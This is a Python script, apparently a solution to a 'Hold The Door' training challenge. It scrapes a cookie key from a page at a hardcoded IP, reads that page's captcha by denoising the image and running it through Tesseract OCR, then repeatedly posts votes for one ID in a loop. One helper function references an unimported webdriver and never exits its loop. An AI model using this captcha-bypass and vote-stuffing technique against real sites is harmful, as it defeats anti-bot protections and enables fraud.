#!/usr/bin/python3
#opebcv : pip install opencv-python
import requests
import time
import pytesseract
from PIL import Image
import cv2
from scipy import ndimage
from skimage import io
def GetPage(pageName):
    c = True
    opts = webdriver.chrome.options.Options()
    opts.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36")
    chromeProfilePath = "./tempfile/"
    #opts.add_argument("user-data-dir=" + chromeProfilePath)
    driver = webdriver.Chrome(options=opts)
    driver.get(pageName)
    print("ELEMENT")
    #element = driver.find_element_by_xpath('//img')
    element = driver.find_element_by_tag_name('h1')
    print(element)
    while (c):
        pass

def GetPageRequest1(pageName):
    session = requests.Session()
    headers = {
        "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8", 
        "Accept-Encoding": "gzip, deflate", 
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", 
        "Host": "158.69.76.135",
        "Referer": pageName,
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
        }
    r = session.get(pageName)
    cookies = r.cookies.get_dict()
    key1 = cookies.get('HoldTheDoor')
    #print(r.text)
    img = session.get('http://158.69.76.135/tim.php')

    with open('./test.png', 'wb') as f:
        f.write(img.content)
        f.close()
    im_noise = Image.open('./test.png')
    im_med = ndimage.median_filter(im_noise, 3)
    io.imsave('./retreate2.png', im_med)
    capcha = pytesseract.image_to_string(Image.open('./retreate2.png'))
    capcha = capcha.replace("\n", "")
    capcha2 = ""
    for i in capcha:
        if i.isalnum():
            capcha2 += i
    print("capcha2 value : " + str(capcha2))
    if len(capcha2) == 8:
        r = session.post(pageName, cookies = cookies, headers = headers, data = {'id':'2490','key': key1,'holdthedoor':'Envoyer','captcha': capcha2})
        print(r.text)
        if "hacker" in str(r.text):
            print("Tesseract fail")
            #print(r.text)
            return(False)
        else:
            return(True)
    else:
        return(False)
cp = 70
while cp <= 1024:
    print("CP =  {}".format(cp))
    if GetPageRequest1("http://158.69.76.135/level5.php") == True:
        cp += 1
        print("True {}".format(cp))
    else:
        print("Fail")
    time.sleep(1)
